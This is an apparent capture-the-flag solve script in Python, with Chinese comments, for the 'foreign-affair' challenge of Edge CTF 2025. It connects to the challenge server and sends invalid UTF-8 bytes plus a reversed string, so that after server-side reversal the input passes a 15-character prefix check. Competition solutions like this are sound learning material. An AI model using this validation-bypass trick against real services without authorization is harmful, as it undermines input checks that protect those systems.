#!/usr/bin/env python3
"""
Edge CTF 2025 - foreign-affair 解法 v2

关键：无效UTF-8字节应该放在payload的开头，
这样反转后它们在末尾，不影响前15个字符的匹配
"""
import socket

def exploit():
    host = "foreign-affair.chall.edgesecurity.team"
    port = 1338
    
    print("="*70)
    print("Edge CTF 2025 - foreign-affair 解法 v2")
    print("="*70)
    print()
    
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            s.connect((host, port))
            
            # 接收欢迎信息
            welcome = s.recv(4096)
            print(f"[<] {welcome.decode('utf-8', errors='replace')}")
            
            # 构造payload:
            # 无效UTF-8在前面，这样反转后在后面
            # 格式: [无效UTF-8] + "SNOITPECXEXXCON"
            # 反转后: "NOCXXEXCEPTIONS" + [无效UTF-8的反转]
            invalid_utf8 = b"\xff\xfe"
            valid_part = b"SNOITPECXEXXCON"
            payload = invalid_utf8 + valid_part + b"\n"
            
            print(f"\n[*] Payload: {repr(payload)}")
            print(f"[*] 发送后会被反转为: {repr(payload[:-1][::-1])}")
            print(f"[*] 前15个字符: {repr(payload[:-1][::-1][:15])}")
            
            s.sendall(payload)
            
            # 等待响应
            import time
            time.sleep(2)
            
            response = b""
            s.settimeout(5)
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                pass
            
            print(f"\n[+] 响应:")
            print("="*70)
            if response:
                print(response.decode('utf-8', errors='replace'))
            else:
                print("(无响应)")
            print("="*70)
            
    except Exception as e:
        print(f"[-] 错误: {e}")

if __name__ == "__main__":
    exploit()